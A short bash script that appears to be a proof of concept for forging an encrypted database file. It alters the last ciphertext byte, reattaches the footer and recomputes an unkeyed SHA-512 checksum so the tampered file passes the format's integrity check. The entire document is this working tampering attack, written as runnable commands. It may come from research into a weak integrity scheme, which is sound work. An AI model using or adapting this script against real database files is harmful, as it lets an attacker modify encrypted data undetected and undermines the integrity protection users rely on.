#!/bin/bash

filesize=`ls -la $1 | cut -f 5 -d " "`
checksum_offset=$((filesize-64))
footer_offset=$((filesize-64-64-64))
ciphertext_offset=$((512+32))
checksum_size=64
footer_size=$((checksum_size*3))
dbfile=$1
forgeryfile=$2

echo "Checksum offset $checksum_offset"
echo "Footer offset $footer_offset"

echo "Copying all of database except one byte before footer into new file..."
echo "dd if=$dbfile of=$forgeryfile bs=1 count=$((footer_offset-1))"
dd if=$dbfile of=$forgeryfile bs=1 count=$((footer_offset-1))
echo "Replacing last byte of cipher-text with a 0"
echo "echo -n -e '\x00' >> $forgeryfile"
echo -n -e "\x00" >> $forgeryfile
echo "Appending rest of footer to new database"
echo "dd if=$dbfile of=$forgeryfile bs=1 skip=$((footer_offset)) count=$((footer_size-checksum_size)) conv=notrunc oflag=append"
dd if=$dbfile of=$forgeryfile bs=1 skip=$((footer_offset)) count=$((footer_size-checksum_size)) conv=notrunc oflag=append
echo "Generating new checksum of modified database to forge with"
forgery_checksum=`sha512sum $forgeryfile | cut -d " " -f 1`
echo "$forgery_checksum"
echo "Appending checksum to database"
echo "echo -n -e "$( echo $forgery_checksum | sed -E "s/.{,2}/\\\x&/g")" >> $forgeryfile"
echo -n -e "$( echo $forgery_checksum | sed -E "s/.{,2}/\\\x&/g")" >> $forgeryfile

